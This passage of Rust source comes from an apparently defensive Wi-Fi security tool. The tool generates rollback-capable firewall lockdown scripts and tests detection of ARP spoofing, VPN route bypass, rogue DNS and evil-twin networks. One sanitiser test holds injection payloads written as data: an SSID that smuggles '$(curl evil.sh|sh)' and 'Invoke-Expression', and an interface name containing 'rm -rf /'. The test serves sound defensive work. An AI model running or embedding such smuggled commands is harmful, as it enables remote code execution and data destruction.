    port < 49152 && !matches!(port, 53 | 68 | 123 | 500 | 546 | 4500 | 51820)
}

/// Converts arbitrary untrusted text into pure 7-bit printable ASCII without quotes, `$`, `` ` ``,
/// `\`, `#`, or line breaks — immune to PowerShell 5.1 CP1252/smart-quote breakout (`CWE-78`/`CWE-176`)
/// and POSIX shell expansion.
fn ascii_comment_safe(s: &str) -> String {
    let mut out = String::with_capacity(s.len().min(96));
    for c in s.chars().take(80) {
        if c.is_ascii_alphanumeric() || matches!(c, ' ' | '.' | '_' | '-' | ':' | '/' | '(' | ')') {
            out.push(c);
        } else {
            out.push_str(&format!("\\u{{{:04x}}}", c as u32));
        }
    }
    out
}

/// Default platform filename for the generated Zero-Trust Wi-Fi Lockdown Script.
#[must_use]
pub fn default_lockdown_script_filename() -> &'static str {
    if cfg!(windows) {
        "safe_door_wifi_lockdown.ps1"
    } else {
        "safe_door_wifi_lockdown.sh"
    }
}

/// Generates a deterministic, 100% pure 7-bit ASCII, rollback-capable host firewall lockdown script
/// tailored to the snapshot's exposed sockets and active Wi-Fi interface.
#[must_use]
pub fn generate_wifi_lockdown_script(
    connections: &[ConnectionEntry],
    wifi: Option<&WifiShieldReport>,
    target_windows: bool,
) -> String {
    let mut tcp_ports: BTreeSet<u16> = BTreeSet::new();
    let mut udp_ports: BTreeSet<u16> = BTreeSet::new();

    // Always harden classic lateral movement & local name-poisoning ports on Public Wi-Fi
    for p in [135u16, 139, 445, 5985, 5986] {
        tcp_ports.insert(p);
    }
    for p in [137u16, 138, 5353, 5355] {
        udp_ports.insert(p);
    }
    // Include all Shadow AI ports + every live wildcard/LAN listener discovered on the host (excluding SSH 22 so admins never lock out remote recovery).
    for &(p, _) in SHADOW_AI_AND_AGENT_PORTS {
        tcp_ports.insert(p);
    }
    for c in connections {
        if c.is_listening()
            && c.local_port != 22
            && (c.exposure.is_network_reachable()
                || c.exposure == ExposureScope::LoopbackProxy)
        {
            if c.protocol.is_tcp() {
                tcp_ports.insert(c.local_port);
            } else if is_lockdown_eligible_udp_port(c.local_port) {
                udp_ports.insert(c.local_port);
            }
        }
    }

    let safe_ssid = wifi
        .map(|w| ascii_comment_safe(&w.ssid))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "Untrusted-WiFi".to_string());
    let safe_bssid = wifi
        .map(|w| ascii_comment_safe(&w.bssid))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "unknown".to_string());

    let tcp_csv = tcp_ports
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join(",");
    let udp_csv = udp_ports
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join(",");

    let mut s = String::with_capacity(2048);
    if target_windows {
        s.push_str("#Requires -RunAsAdministrator\n");
        s.push_str("param([switch]$Rollback)\n");
        s.push_str("# Unlatched Zero-Trust Public Wi-Fi Shield Lockdown Script (7-bit ASCII)\n");
        s.push_str(&format!(
            "# Target SSID: {} | BSSID: {}\n",
            safe_ssid, safe_bssid
        ));
        s.push_str("# Rollback at any time: powershell -ExecutionPolicy Bypass -File .\\safe_door_wifi_lockdown.ps1 -Rollback\n\n");
        s.push_str("$ErrorActionPreference = 'Stop'\n");
        s.push_str("Remove-NetFirewallRule -Name 'Unlatched-WiFiShield-*' -ErrorAction SilentlyContinue\n");
        s.push_str("if ($Rollback) {\n");
        s.push_str("    Write-Host '[Unlatched] Removed all temporary Wi-Fi Shield firewall rules.'\n");
        s.push_str("    exit 0\n");
        s.push_str("}\n\n");
        if let Some(idx) = wifi.and_then(|w| w.interface_index) {
            s.push_str(&format!(
                "Set-NetConnectionProfile -InterfaceIndex {} -NetworkCategory Public -ErrorAction SilentlyContinue\n",
                idx
            ));
        } else {
            s.push_str("Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and $_.MediaType -match '802\\.11|Native 802\\.11' } | ForEach-Object {\n");
            s.push_str("    Set-NetConnectionProfile -InterfaceIndex $_.ifIndex -NetworkCategory Public -ErrorAction SilentlyContinue\n");
            s.push_str("}\n");
        }
        if !tcp_ports.is_empty() {
            let ps_tcp = tcp_ports
                .iter()
                .map(|p| format!("'{}'", p))
                .collect::<Vec<_>>()
                .join(",");
            s.push_str(&format!(
                "New-NetFirewallRule -Name 'Unlatched-WiFiShield-TCP-In' -DisplayName 'Unlatched Wi-Fi Shield (Block Inbound TCP)' -Direction Inbound -Profile Public -Action Block -Protocol TCP -LocalPort @({}) | Out-Null\n",
                ps_tcp
            ));
        }
        if !udp_ports.is_empty() {
            let ps_udp = udp_ports
                .iter()
                .map(|p| format!("'{}'", p))
                .collect::<Vec<_>>()
                .join(",");
            s.push_str(&format!(
                "New-NetFirewallRule -Name 'Unlatched-WiFiShield-UDP-In' -DisplayName 'Unlatched Wi-Fi Shield (Block Inbound UDP)' -Direction Inbound -Profile Public -Action Block -Protocol UDP -LocalPort @({}) | Out-Null\n",
                ps_udp
            ));
        }
        s.push_str("Write-Host '[Unlatched] Public Wi-Fi Shield active: profile set to Public and exposed inbound ports blocked.'\n");
    } else {
        let safe_ifname = wifi
            .map(|w| &w.interface_name)
            .filter(|n| {
                !n.is_empty()
                    && n.len() <= 15
                    && !n.starts_with('-')
                    && n.bytes()
                        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
            })
            .cloned()
            .unwrap_or_else(|| "wlan0".to_string());

        s.push_str("#!/usr/bin/env sh\n");
        s.push_str("set -eu\n");
        s.push_str("# Unlatched Zero-Trust Public Wi-Fi Shield Lockdown Script (7-bit ASCII)\n");
        s.push_str(&format!(
            "# Target SSID: {} | BSSID: {}\n",
            safe_ssid, safe_bssid
        ));
        s.push_str("# Rollback at any time: sudo sh ./safe_door_wifi_lockdown.sh --rollback\n\n");
        s.push_str("if [ \"${1:-}\" = \"--rollback\" ]; then\n");
        s.push_str("    nft delete table inet unlatched_wifi_shield 2>/dev/null || true\n");
        s.push_str("    printf '%s\\n' '[Unlatched] Removed inet unlatched_wifi_shield table.'\n");
        s.push_str("    exit 0\n");
        s.push_str("fi\n\n");
        s.push_str("nft delete table inet unlatched_wifi_shield 2>/dev/null || true\n");
        s.push_str("nft add table inet unlatched_wifi_shield\n");
        s.push_str(
            "nft 'add chain inet unlatched_wifi_shield input { type filter hook input priority -10 ; policy accept ; }'\n",
        );
        if !tcp_csv.is_empty() {
            s.push_str(&format!(
                "nft 'add rule inet unlatched_wifi_shield input iifname \"{}\" tcp dport {{ {} }} drop'\n",
                safe_ifname, tcp_csv
            ));
        }
        if !udp_csv.is_empty() {
            s.push_str(&format!(
                "nft 'add rule inet unlatched_wifi_shield input iifname \"{}\" udp dport {{ {} }} drop'\n",
                safe_ifname, udp_csv
            ));
        }
        s.push_str("printf '%s\\n' '[Unlatched] Public Wi-Fi Shield nftables rules active.'\n");
    }

    debug_assert!(s.is_ascii(), "Lockdown script must be strictly 7-bit ASCII");
    s
}

/// Atomically writes the platform lockdown script via hardened `write_report_atomic`.
pub fn export_wifi_lockdown_script(
    connections: &[ConnectionEntry],
    wifi: Option<&WifiShieldReport>,
    output_path: &Path,
) -> Result<(), String> {
    let target_win = output_path
        .extension()
        .and_then(|e| e.to_str())
        .map_or(cfg!(windows), |ext| ext.eq_ignore_ascii_case("ps1"));
    let script = generate_wifi_lockdown_script(connections, wifi, target_win);
    write_report_atomic(output_path, script.as_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{ConnectionEntry, Protocol};
    use std::net::{IpAddr, Ipv4Addr};

    fn sample_conn(
        proto: Protocol,
        local_ip: Ipv4Addr,
        local_port: u16,
        remote: Option<(Ipv4Addr, u16)>,
        exposure: ExposureScope,
        remote_category: IpCategory,
    ) -> ConnectionEntry {
        ConnectionEntry {
            id: 1,
            protocol: proto,
            local_ip: IpAddr::V4(local_ip),
            local_port,
            remote_ip: remote.map(|(ip, _)| IpAddr::V4(ip)),
            remote_port: remote.map(|(_, p)| p),
            remote_hostname: None,
            state: if remote.is_some() {
                "ESTABLISHED".to_string()
            } else {
                "LISTEN".to_string()
            },
            pid: Some(4242),
            process_name: "ollama.exe".to_string(),
            exe_path: r"C:\Users\alice\AppData\Local\Programs\Ollama\ollama.exe".to_string(),
            cmdline: "ollama serve".to_string(),
            sha256: None,
            lineage: vec!["ollama.exe(4242)".to_string()],
            exposure,
            remote_category,
            service_name: "Custom".to_string(),
            severity: Severity::Low,
            risk_reasons: Vec::new(),
        }
    }

    #[test]
    fn parses_italian_win11_netsh_output_with_glued_bssid_and_ieee_akm() {
        let italian_netsh = "\
Interfacce presenti nel sistema: 1: 

    Nome                   : Wi-Fi
    Descrizione            : Intel(R) Wi-Fi 7 BE201 320MHz
    GUID                   : 76302ea9-6e05-44d9-b217-d0000907e9f5
    Indirizzo fisico       : 40:c7:3c:da:2a:d2
    Stato                  : connessa
    SSID                   : Forest Hongo by unito - guest
    BSSID AP                  : 00:2b:f5:0e:db:f3Banda    
                   : 2,4 GHz    Canale
                : 1crittografia Akm connessa 
    : [ akm = 00-0f-ac:08, crittografia = 00-0f-ac:04 ]
    Tipo frequenza radio   : 802.11n
    Autenticazione            : WPA3-PersonalCrittografia    
                 : CCMP
    Segnale             : 96% 
    Rssi                   : -35
";
        let parsed = parse_windows_netsh_wlan(italian_netsh);
        assert!(parsed.connected);
        assert_eq!(
            parsed.guid.as_deref(),
            Some("76302ea9-6e05-44d9-b217-d0000907e9f5")
        );
        assert_eq!(parsed.ssid, "Forest Hongo by unito - guest");
        assert_eq!(parsed.bssid, "00:2b:f5:0e:db:f3");
        assert_eq!(parsed.auth_suite, "WPA3-Personal (SAE)");
        assert_eq!(parsed.cipher_suite, "CCMP-128 (AES)");
        assert_eq!(
            parsed.auth_strength,
            Some(WifiAuthStrength::StrongSaeOrEnterprise)
        );
        assert_eq!(parsed.signal_percent, Some(96));
        assert_eq!(parsed.rssi_dbm, Some(-35));
    }

    #[test]
    fn detects_arp_spoofing_tunnelvision_shadow_ai_and_evil_twin_downgrade() {
        let arp_raw = "\
Interfaccia: 172.16.1.23 --- 0xf
  Indirizzo Internet    Indirizzo fisico      Tipo
  172.16.0.1            ac-44-f2-ba-33-20     dinamico
  172.16.9.99           ac-44-f2-ba-33-20     dinamico
  224.0.0.251           01-00-5e-00-00-fb     statico
  255.255.255.255       ff-ff-ff-ff-ff-ff     statico
";
        let route_raw = "\
===========================================================================
Elenco interfacce
 24...00 09 0f fe 00 01 ......WireGuard Tunnel Adapter
 15...40 c7 3c da 2a d2 ......Intel(R) Wi-Fi 7 BE201 320MHz
===========================================================================
Route attive:
          0.0.0.0          0.0.0.0         10.8.0.1         10.8.0.2      5
          0.0.0.0        128.0.0.0       172.16.0.1      172.16.1.23     10
        128.0.0.0        128.0.0.0       172.16.0.1      172.16.1.23     10
";
        let wifi_ip = Ipv4Addr::new(172, 16, 1, 23);
        let arp = parse_windows_arp_table(arp_raw, Some(wifi_ip));
        let route = parse_windows_ipv4_routes(route_raw, Some(wifi_ip));
        assert!(route.vpn_active);
        assert!(route.tunnelvision_bypass, "must flag CVE-2024-3661 /1 route hijack");

        let mut radar = WifiRadarState::new();
        let mut findings = Vec::new();
        let conns = vec![
            // Exposed Ollama port 11434 on 0.0.0.0
            sample_conn(
                Protocol::Tcp,
                Ipv4Addr::UNSPECIFIED,
                11434,
                None,
                ExposureScope::WildcardAllInterfaces,
                IpCategory::Unspecified,
            ),
            // Outbound cleartext HTTP port 80
            sample_conn(
                Protocol::Tcp,
                wifi_ip,
                51234,
                Some((Ipv4Addr::new(93, 184, 216, 34), 80)),
                ExposureScope::LocalLan,
                IpCategory::PublicInternet,
            ),
        ];

        // Cycle 1: WPA3 hotel Wi-Fi, Private misconfiguration, ARP collision, TunnelVision, Shadow AI, HTTP
        let snap1 = RawLinkSnapshot {
            wifi: ParsedWifiInterface {
                connected: true,
                interface_name: "Wi-Fi".to_string(),
                guid: Some("76302ea9-6e05-44d9-b217-d0000907e9f5".to_string()),
                ssid: "Airport Free WiFi".to_string(),
                bssid: "00:2b:f5:0e:db:f3".to_string(),
                auth_suite: "WPA3-Personal (SAE)".to_string(),
                cipher_suite: "CCMP-128 (AES)".to_string(),
                auth_strength: Some(WifiAuthStrength::StrongSaeOrEnterprise),
                radio_info: "802.11ax".to_string(),
                signal_percent: Some(90),
                rssi_dbm: Some(-42),
            },
            profile_category: WifiProfileCategory::Private,
            local_ip: Some(IpAddr::V4(wifi_ip)),
            subnet_prefix: Some(16),
            dhcp_server: Some(IpAddr::V4(Ipv4Addr::new(172, 16, 0, 1))),
            dns_servers: vec![IpAddr::V4(Ipv4Addr::new(198, 51, 100, 53))], // Rogue external IP
            route: ParsedRouteTelemetry {
                default_gateway: Some(Ipv4Addr::new(172, 16, 0, 1)),
                ..route.clone()
            },
            arp_neighbors: arp,
        };

        let report1 = radar.analyze_link_snapshot(snap1.clone(), &conns, &mut findings);
        assert!(findings.iter().any(|f| f.rule_id == "H10-ARP-MITM"));
        assert!(findings.iter().any(|f| f.rule_id == "H10-WIFI-PRIVATE-PROFILE"));
        assert!(findings.iter().any(|f| f.rule_id == "H10-WIFI-ROGUE-DNS"));
        assert!(findings.iter().any(|f| f.rule_id == "H10-VPN-BYPASS"));
        assert!(findings.iter().any(|f| f.rule_id == "H10-WIFI-SHADOW-AI"));
        assert!(findings.iter().any(|f| f.rule_id == "H10-WIFI-CLEARTEXT"));
        assert_eq!(report1.exposed_shadow_ai_ports, vec![11434]);

        // Cycle 2: Attacker launches Open Evil-Twin on same SSID
        let mut findings2 = Vec::new();
        let mut snap2 = snap1;
        snap2.wifi.bssid = "de:ad:be:ef:11:22".to_string();
        snap2.wifi.auth_suite = "OPEN (Unencrypted)".to_string();
        snap2.wifi.cipher_suite = "NONE (Cleartext)".to_string();
        snap2.wifi.auth_strength = Some(WifiAuthStrength::OpenOrBroken);

        let _report2 = radar.analyze_link_snapshot(snap2, &conns, &mut findings2);
        assert!(findings2.iter().any(|f| f.rule_id == "H10-WIFI-EVIL-TWIN"));
        assert!(findings2.iter().any(|f| f.rule_id == "H10-WIFI-OPEN"));
    }

    #[test]
    fn lockdown_script_is_pure_7bit_ascii_and_blocks_evil_twin_ssid_injection() {
        let conns = vec![sample_conn(
            Protocol::Tcp,
            Ipv4Addr::UNSPECIFIED,
            11434,
            None,
            ExposureScope::WildcardAllInterfaces,
            IpCategory::Unspecified,
        )];
        let hostile_ssid =
            "Cafe\u{2019}s_WiFi'; Invoke-Expression calc.exe; \u{2028}$(curl evil.sh|sh)\n#";
        let fake_report = WifiShieldReport {
            connected: true,
            interface_name: "-bad;rm -rf /".to_string(),
            interface_guid: None,
            interface_index: Some(15),
            ssid: hostile_ssid.to_string(),
            bssid: "00:2b:f5:0e:db:f3".to_string(),
            auth_suite: "OPEN".to_string(),
            cipher_suite: "NONE".to_string(),
            radio_info: "802.11n".to_string(),
            signal_percent: Some(80),
            rssi_dbm: None,
            profile_category: WifiProfileCategory::Public,
            local_ip: None,
            subnet_prefix: Some(16),
            gateway_ip: None,
            gateway_mac: None,
            dhcp_server: None,
            dns_servers: Vec::new(),
            vpn_active: false,
            vpn_interfaces: Vec::new(),
            tunnelvision_bypass: false,
            is_public_or_guest_ssid: true,
            wifi_safety_score: 40,
            wifi_grade: "D".to_string(),
            risk_level: Severity::Critical,
            exposed_lan_listeners: 1,
            exposed_shadow_ai_ports: vec![11434],
            cleartext_sockets: 0,
            checks: Vec::new(),
        };

        let ps1 = generate_wifi_lockdown_script(&conns, Some(&fake_report), true);
        let sh = generate_wifi_lockdown_script(&conns, Some(&fake_report), false);

        assert!(ps1.is_ascii(), "PowerShell script must be 100% 7-bit ASCII");
        assert!(sh.is_ascii(), "POSIX script must be 100% 7-bit ASCII");
        assert!(!ps1.contains('\u{2019}') && !ps1.contains("$(curl"));
        assert!(!sh.contains("-bad;rm") && sh.contains("iifname \"wlan0\""));
        assert!(ps1.contains("11434") && ps1.contains("445"));
        assert!(ps1.contains("-InterfaceIndex 15 -NetworkCategory Public"));
        assert!(sh.contains("--rollback") && ps1.contains("param([switch]$Rollback)"));
    }

    #[test]
    fn parses_linux_proc_arp_route_nmcli_and_resolv_conf() {
        let nmcli_out = "no:wlan0:OtherNet:AA\\:BB\\:CC\\:DD\\:EE\\:01:WPA2:6:55\nyes:wlan0:Cafe\\:Free:10\\:20\\:30\\:40\\:50\\:60:--:11:88\n";
        let wifi = parse_linux_nmcli_wifi(nmcli_out, "wlan0").unwrap();
        assert!(wifi.connected);
        assert_eq!(wifi.ssid, "Cafe:Free");
        assert_eq!(wifi.bssid, "10:20:30:40:50:60");
        assert_eq!(wifi.auth_strength, Some(WifiAuthStrength::OpenOrBroken));
        assert_eq!(wifi.signal_percent, Some(88));

        // Little-endian hex IPv4: 192.168.1.1 = 0101A8C0, 128.0.0.0 = 00000080
        let route_out = "Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\tMTU\tWindow\tIRTT\n\
wg0\t00000000\t0100080A\t0003\t0\t0\t50\t00000000\t0\t0\t0\n\
wlan0\t00000000\t0101A8C0\t0003\t0\t0\t600\t00000000\t0\t0\t0\n\
wlan0\t00000000\t0101A8C0\t0003\t0\t0\t10\t00000080\t0\t0\t0\n\
wlan0\t00000080\t0101A8C0\t0003\t0\t0\t10\t00000080\t0\t0\t0\n";
        let route = parse_linux_proc_route(route_out, "wlan0");
        assert_eq!(route.default_gateway, Some(Ipv4Addr::new(192, 168, 1, 1)));
        assert!(route.vpn_active);
        assert!(route.tunnelvision_bypass);

        let arp_out = "IP address       HW type     Flags       HW address            Mask     Device\n\
192.168.1.1      0x1         0x2         aa:bb:cc:11:22:33     *        wlan0\n\
172.17.0.2       0x1         0x2         aa:bb:cc:11:22:33     *        docker0\n";
        let arp = parse_linux_proc_arp(arp_out, "wlan0");
        assert_eq!(arp.len(), 1, "docker0 MAC must not pollute wlan0 ARP table");

        let dns = parse_resolv_conf("# systemd-resolved\nnameserver 1.1.1.1\nnameserver 9.9.9.9 # backup\n");
        assert_eq!(dns.len(), 2);
    }
}
